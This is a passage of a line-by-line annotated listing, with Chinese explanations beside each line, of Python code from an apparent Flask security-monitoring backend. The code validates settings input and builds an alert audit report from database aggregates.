| 3359 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    normalized: Dict[str, Any] = {}` |
| 3360 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    errors: Dict[str, str] = {}` |
| 3361 | 循环：逐个处理集合或迭代器中的元素。 | `    for key, raw in payload.items():` |
| 3362 | 条件判断：满足条件时进入对应分支。 | `        if key not in SETTINGS_SCHEMA:` |
| 3363 | 注释：解释下面或当前这段代码的设计意图。 | `            # 忽略未知字段，但不报错，保持 PATCH-friendly 语义` |
| 3364 | 继续循环：跳过本轮剩余逻辑。 | `            continue` |
| 3365 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        spec = SETTINGS_SCHEMA[key]` |
| 3366 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        kind = spec["type"]` |
| 3367 | 条件判断：满足条件时进入对应分支。 | `        if kind == "float":` |
| 3368 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 3369 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                v = float(raw)` |
| 3370 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except (TypeError, ValueError):` |
| 3371 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                errors[key] = "必须是数字"` |
| 3372 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 3373 | 函数调用：执行已有函数/方法完成当前步骤。 | `            lo, hi = spec.get("min", 0.0), spec.get("max", 1.0)` |
| 3374 | 条件判断：满足条件时进入对应分支。 | `            if v < lo or v > hi:` |
| 3375 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                errors[key] = f"必须在 {lo} ~ {hi}"` |
| 3376 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 3377 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            normalized[key] = round(v, 4)` |
| 3378 | 条件分支：前面条件不满足时继续判断。 | `        elif kind == "bool":` |
| 3379 | 条件判断：满足条件时进入对应分支。 | `            if isinstance(raw, bool):` |
| 3380 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                normalized[key] = raw` |
| 3381 | 条件分支：前面条件不满足时继续判断。 | `            elif isinstance(raw, str):` |
| 3382 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                s = raw.strip().lower()` |
| 3383 | 条件判断：满足条件时进入对应分支。 | `                if s in ("true", "1", "yes", "on"):` |
| 3384 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    normalized[key] = True` |
| 3385 | 条件分支：前面条件不满足时继续判断。 | `                elif s in ("false", "0", "no", "off", ""):` |
| 3386 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    normalized[key] = False` |
| 3387 | 兜底分支：处理前面条件都不满足的情况。 | `                else:` |
| 3388 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    errors[key] = "必须是 true / false"` |
| 3389 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 3390 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                errors[key] = "必须是布尔值"` |
| 3391 | 条件分支：前面条件不满足时继续判断。 | `        elif kind == "email":` |
| 3392 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            value = str(raw or "").strip()` |
| 3393 | 条件判断：满足条件时进入对应分支。 | `            if not value and spec.get("optional"):` |
| 3394 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                normalized[key] = ""` |
| 3395 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 3396 | 条件判断：满足条件时进入对应分支。 | `            if not _EMAIL_RE.match(value):` |
| 3397 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                errors[key] = "邮箱格式不合法"` |
| 3398 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 3399 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            normalized[key] = value` |
| 3400 | 条件分支：前面条件不满足时继续判断。 | `        elif kind == "url":` |
| 3401 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            value = str(raw or "").strip()` |
| 3402 | 条件判断：满足条件时进入对应分支。 | `            if not value and spec.get("optional"):` |
| 3403 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                normalized[key] = ""` |
| 3404 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 3405 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            err = _validate_webhook_url(value)` |
| 3406 | 条件判断：满足条件时进入对应分支。 | `            if err:` |
| 3407 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                errors[key] = err` |
| 3408 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 3409 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            normalized[key] = value` |
| 3410 | 条件分支：前面条件不满足时继续判断。 | `        elif kind == "string":` |
| 3411 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            value = str(raw or "").strip()` |
| 3412 | 条件判断：满足条件时进入对应分支。 | `            if not value:` |
| 3413 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                errors[key] = "不能为空"` |
| 3414 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 3415 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            pattern = spec.get("pattern")` |
| 3416 | 条件判断：满足条件时进入对应分支。 | `            if pattern and not re.match(pattern, value):` |
| 3417 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                errors[key] = "格式非法"` |
| 3418 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 3419 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            normalized[key] = value` |
| 3420 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3421 | 注释：解释下面或当前这段代码的设计意图。 | `    # 跨字段规则：告警阈值不应高于检测灵敏度` |
| 3422 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    effective_sens = normalized.get("detection_sensitivity")` |
| 3423 | 条件判断：满足条件时进入对应分支。 | `    if effective_sens is None:` |
| 3424 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        effective_sens = existing.get("detection_sensitivity")` |
| 3425 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    effective_thr = normalized.get("alert_threshold")` |
| 3426 | 条件判断：满足条件时进入对应分支。 | `    if effective_thr is None:` |
| 3427 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        effective_thr = existing.get("alert_threshold")` |
| 3428 | 条件判断：满足条件时进入对应分支。 | `    if (` |
| 3429 | 代码语句：参与当前文件的业务流程或数据处理。 | `        effective_thr is not None` |
| 3430 | 代码语句：参与当前文件的业务流程或数据处理。 | `        and effective_sens is not None` |
| 3431 | 代码语句：参与当前文件的业务流程或数据处理。 | `        and "alert_threshold" not in errors` |
| 3432 | 函数调用：执行已有函数/方法完成当前步骤。 | `        and float(effective_thr) > float(effective_sens)` |
| 3433 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ):` |
| 3434 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        errors["alert_threshold"] = "不能高于检测灵敏度"` |
| 3435 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3436 | 返回结果：把处理后的值交回调用方。 | `    return normalized, errors` |
| 3437 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3438 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3439 | 函数定义：声明 `_build_settings_snapshot` 的输入、处理逻辑和返回结果。 | `def _build_settings_snapshot(app: Flask) -> Dict[str, Any]:` |
| 3440 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    state: _ServerState = app.extensions["guardian_state"]` |
| 3441 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    cfg = get_config()` |
| 3442 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    editable = state.all_settings()` |
| 3443 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    runtime = {` |
| 3444 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "jwt_access_expires_seconds": int(cfg.JWT_TOKEN_EXPIRES),` |
| 3445 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "jwt_refresh_expires_seconds": int(cfg.JWT_REFRESH_TOKEN_EXPIRES),` |
| 3446 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "api_rate_limit": cfg.API_RATE_LIMIT,` |
| 3447 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "log_integrity_enabled": bool(cfg.LOG_INTEGRITY_ENABLED),` |
| 3448 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "allowed_origins": list(cfg.ALLOWED_ORIGINS),` |
| 3449 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3450 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 3451 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "editable": editable,` |
| 3452 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "runtime": runtime,` |
| 3453 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "schema": SETTINGS_SCHEMA,` |
| 3454 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3455 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3456 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3457 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 3458 | 注释：解释下面或当前这段代码的设计意图。 | `# 审计报告：从现有状态即席聚合 5 个模块` |
| 3459 | 注释：解释下面或当前这段代码的设计意图。 | `# =====================================================================` |
| 3460 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_PERIOD_DELTA: Dict[str, timedelta] = {` |
| 3461 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "day": timedelta(days=1),` |
| 3462 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "week": timedelta(days=7),` |
| 3463 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "month": timedelta(days=30),` |
| 3464 | 代码语句：参与当前文件的业务流程或数据处理。 | `}` |
| 3465 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3466 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3467 | 函数定义：声明 `_report_window` 的输入、处理逻辑和返回结果。 | `def _report_window(period: str) -> Tuple[datetime, datetime]:` |
| 3468 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    now = datetime.now(timezone.utc).astimezone()` |
| 3469 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    start = now - _PERIOD_DELTA.get(period, timedelta(days=1))` |
| 3470 | 返回结果：把处理后的值交回调用方。 | `    return start, now` |
| 3471 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3472 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3473 | 函数定义：声明 `_build_report_summary` 的输入、处理逻辑和返回结果。 | `def _build_report_summary(app: Flask, *, period: str = "day") -> Dict[str, Any]:` |
| 3474 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    state: _ServerState = app.extensions["guardian_state"]` |
| 3475 | 函数调用：执行已有函数/方法完成当前步骤。 | `    start, end = _report_window(period)` |
| 3476 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    start_u = start.astimezone(timezone.utc)` |
| 3477 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    end_u = end.astimezone(timezone.utc)` |
| 3478 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3479 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    base = db.session.query(Alert).filter(` |
| 3480 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Alert.timestamp >= start_u,` |
| 3481 | 代码语句：参与当前文件的业务流程或数据处理。 | `        Alert.timestamp <= end_u,` |
| 3482 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3483 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    total_alerts = base.count()` |
| 3484 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3485 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    level_rows = (` |
| 3486 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(Alert.level, func.count(Alert.id))` |
| 3487 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter(Alert.timestamp >= start_u, Alert.timestamp <= end_u)` |
| 3488 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .group_by(Alert.level)` |
| 3489 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .all()` |
| 3490 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3491 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    by_level: Dict[str, int] = {lv: 0 for lv in ALERT_LEVELS}` |
| 3492 | 循环：逐个处理集合或迭代器中的元素。 | `    for lv, cnt in level_rows:` |
| 3493 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        key = str(lv or "low")` |
| 3494 | 条件判断：满足条件时进入对应分支。 | `        if key in by_level:` |
| 3495 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            by_level[key] = int(cnt)` |
| 3496 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3497 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    status_rows = (` |
| 3498 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(Alert.status, func.count(Alert.id))` |
| 3499 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter(Alert.timestamp >= start_u, Alert.timestamp <= end_u)` |
| 3500 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .group_by(Alert.status)` |
| 3501 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .all()` |
| 3502 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3503 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    by_status: Dict[str, int] = {st: 0 for st in ALERT_STATUSES}` |
| 3504 | 循环：逐个处理集合或迭代器中的元素。 | `    for st, cnt in status_rows:` |
| 3505 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        key = str(st or "open")` |
| 3506 | 条件判断：满足条件时进入对应分支。 | `        if key in by_status:` |
| 3507 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            by_status[key] = int(cnt)` |
| 3508 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3509 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    type_rows = (` |
| 3510 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(Alert.threat_type, func.count(Alert.id))` |
| 3511 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter(Alert.timestamp >= start_u, Alert.timestamp <= end_u)` |
| 3512 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .group_by(Alert.threat_type)` |
| 3513 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .order_by(func.count(Alert.id).desc())` |
| 3514 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .limit(10)` |
| 3515 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .all()` |
| 3516 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3517 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    by_type = {str(t or "unknown"): int(c) for t, c in type_rows}` |
| 3518 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3519 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    top_rows = (` |
| 3520 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(Alert.source_ip, func.count(Alert.id))` |
| 3521 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter(` |
| 3522 | 代码语句：参与当前文件的业务流程或数据处理。 | `            Alert.timestamp >= start_u,` |
| 3523 | 代码语句：参与当前文件的业务流程或数据处理。 | `            Alert.timestamp <= end_u,` |
| 3524 | 代码语句：参与当前文件的业务流程或数据处理。 | `            Alert.source_ip != "",` |
| 3525 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3526 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .group_by(Alert.source_ip)` |
| 3527 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .order_by(func.count(Alert.id).desc())` |
| 3528 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .limit(10)` |
| 3529 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .all()` |
| 3530 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3531 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    top_sources = {ip: int(c) for ip, c in top_rows}` |
| 3532 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3533 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    avg_conf_raw = (` |
| 3534 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(func.avg(Alert.confidence))` |
| 3535 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .filter(` |
| 3536 | 代码语句：参与当前文件的业务流程或数据处理。 | `            Alert.timestamp >= start_u,` |
| 3537 | 代码语句：参与当前文件的业务流程或数据处理。 | `            Alert.timestamp <= end_u,` |
| 3538 | 函数调用：执行已有函数/方法完成当前步骤。 | `            Alert.confidence.isnot(None),` |
| 3539 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3540 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .scalar()` |
| 3541 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3542 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    avg_conf = round(float(avg_conf_raw), 3) if avg_conf_raw is not None else 0.0` |
| 3543 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3544 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    aw = base.filter(Alert.confidence.isnot(None))` |
| 3545 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    conf_bins = [` |
| 3546 | 函数调用：执行已有函数/方法完成当前步骤。 | `        int(` |
| 3547 | 函数调用：执行已有函数/方法完成当前步骤。 | `            aw.filter(Alert.confidence < 0.2).count(),` |
| 3548 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 3549 | 函数调用：执行已有函数/方法完成当前步骤。 | `        int(` |
| 3550 | 函数调用：执行已有函数/方法完成当前步骤。 | `            aw.filter(Alert.confidence >= 0.2, Alert.confidence < 0.4).count(),` |
| 3551 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 3552 | 函数调用：执行已有函数/方法完成当前步骤。 | `        int(` |
| 3553 | 函数调用：执行已有函数/方法完成当前步骤。 | `            aw.filter(Alert.confidence >= 0.4, Alert.confidence < 0.6).count(),` |
| 3554 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 3555 | 函数调用：执行已有函数/方法完成当前步骤。 | `        int(` |
| 3556 | 函数调用：执行已有函数/方法完成当前步骤。 | `            aw.filter(Alert.confidence >= 0.6, Alert.confidence < 0.8).count(),` |
| 3557 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 3558 | 函数调用：执行已有函数/方法完成当前步骤。 | `        int(aw.filter(Alert.confidence >= 0.8).count()),` |
| 3559 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ]` |
| 3560 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3561 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    buckets = _bucket_timeline_from_db(start, end, period)` |
| 3562 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3563 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    responses = _collect_report_responses(start_u, end_u)` |
| 3564 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3565 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    mv = (` |
| 3566 | 函数调用：执行已有函数/方法完成当前步骤。 | `        db.session.query(ModelVersion)` |
| 3567 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .order_by(` |
| 3568 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ModelVersion.deployed_at.desc().nulls_last(),` |
| 3569 | 函数调用：执行已有函数/方法完成当前步骤。 | `            ModelVersion.id.desc(),` |
| 3570 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3571 | 函数调用：执行已有函数/方法完成当前步骤。 | `        .first()` |
| 3572 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3573 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    mv_label = (` |
| 3574 | 代码语句：参与当前文件的业务流程或数据处理。 | `        mv.version` |
| 3575 | 条件判断：满足条件时进入对应分支。 | `        if mv` |
| 3576 | 兜底分支：处理前面条件都不满足的情况。 | `        else (` |
| 3577 | 函数调用：执行已有函数/方法完成当前步骤。 | `            state.get_setting("model_version")` |
| 3578 | 函数调用：执行已有函数/方法完成当前步骤。 | `            or os.environ.get("MODEL_VERSION", "v1")` |
| 3579 | 函数调用：执行已有函数/方法完成当前步骤。 | `        )` |
| 3580 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3581 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3582 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    model_perf = {` |
| 3583 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "version": mv_label,` |
| 3584 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "registry_note": mv.notes if mv and mv.notes else None,` |
| 3585 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "total_checked": total_alerts,` |
| 3586 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "avg_confidence": avg_conf,` |
| 3587 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "confidence_distribution": [` |
| 3588 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {"range": "0.0 – 0.2", "count": conf_bins[0]},` |
| 3589 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {"range": "0.2 – 0.4", "count": conf_bins[1]},` |
| 3590 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {"range": "0.4 – 0.6", "count": conf_bins[2]},` |
| 3591 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {"range": "0.6 – 0.8", "count": conf_bins[3]},` |
| 3592 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            {"range": "0.8 – 1.0", "count": conf_bins[4]},` |
| 3593 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ],` |
| 3594 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "high_confidence_ratio": (` |
| 3595 | 函数调用：执行已有函数/方法完成当前步骤。 | `            round(sum(conf_bins[3:]) / total_alerts, 3) if total_alerts else 0.0` |
| 3596 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 3597 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "detection_rate": (` |
| 3598 | 函数调用：执行已有函数/方法完成当前步骤。 | `            round(1.0 - (by_status.get("ignored", 0) / total_alerts), 3)` |
| 3599 | 条件判断：满足条件时进入对应分支。 | `            if total_alerts` |
| 3600 | 兜底分支：处理前面条件都不满足的情况。 | `            else 0.0` |
| 3601 | 代码语句：参与当前文件的业务流程或数据处理。 | `        ),` |
| 3602 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "mean_resolution_latency_sec": _mean_resolution_latency_db(start_u, end_u),` |
| 3603 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3604 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3605 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    recommendations = _build_recommendations(` |
| 3606 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        by_level=by_level,` |
| 3607 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        by_status=by_status,` |
| 3608 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        by_type=by_type,` |
| 3609 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        top_sources=top_sources,` |
| 3610 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        total_alerts=total_alerts,` |
| 3611 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        enabled_rules=_rules_enabled_count(),` |
| 3612 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        ioc_total=_active_ioc_count(),` |
| 3613 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        avg_confidence=avg_conf,` |
| 3614 | 函数调用：执行已有函数/方法完成当前步骤。 | `    )` |
| 3615 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3616 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    banned_total = db.session.query(func.count(BannedIp.ip)).scalar() or 0` |
| 3617 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3618 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    overview = {` |
| 3619 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "total_alerts": total_alerts,` |
| 3620 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "critical_alerts": by_level.get("critical", 0),` |
| 3621 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "high_alerts": by_level.get("high", 0),` |
| 3622 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "medium_alerts": by_level.get("medium", 0),` |
| 3623 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "low_alerts": by_level.get("low", 0),` |
| 3624 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "open_alerts": by_status.get("open", 0),` |
| 3625 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "resolved_alerts": by_status.get("resolved", 0),` |
| 3626 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "acknowledged_alerts": by_status.get("acknowledged", 0),` |
| 3627 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "ignored_alerts": by_status.get("ignored", 0),` |
| 3628 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "security_score": _compute_security_score_db(),` |
| 3629 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "banned_ips": int(banned_total),` |
| 3630 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "iocs_total": _active_ioc_count(),` |
| 3631 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "rules_total": _rules_total_count(),` |
| 3632 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "rules_enabled": _rules_enabled_count(),` |
| 3633 | 代码语句：参与当前文件的业务流程或数据处理。 | `    }` |
| 3634 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3635 | 返回结果：把处理后的值交回调用方。 | `    return {` |
| 3636 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "period": period,` |
| 3637 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "window": {` |
| 3638 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "start": start.isoformat(timespec="seconds"),` |
| 3639 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "end": end.isoformat(timespec="seconds"),` |
| 3640 | 代码语句：参与当前文件的业务流程或数据处理。 | `        },` |
| 3641 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "generated_at": _now_iso(),` |
| 3642 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "overview": overview,` |
| 3643 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        "threats": {` |
| 3644 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "by_level": [` |
| 3645 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                {"level": lv, "count": by_level.get(lv, 0)} for lv in ALERT_LEVELS` |
| 3646 | 代码语句：参与当前文件的业务流程或数据处理。 | `            ],` |
| 3647 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "by_type": sorted(` |
| 3648 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                [{"type": k, "count": v} for k, v in by_type.items()],` |
| 3649 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                key=lambda x: -x["count"],` |
| 3650 | 代码语句：参与当前文件的业务流程或数据处理。 | `            )[:10],` |
| 3651 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            "top_sources": sorted(` |
| 3652 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                [{"ip": ip, "count": cnt} for ip, cnt in top_sources.items()],` |
| 3653 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                key=lambda x: -x["count"],` |
| 3654 | 代码语句：参与当前文件的业务流程或数据处理。 | `            )[:10],` |
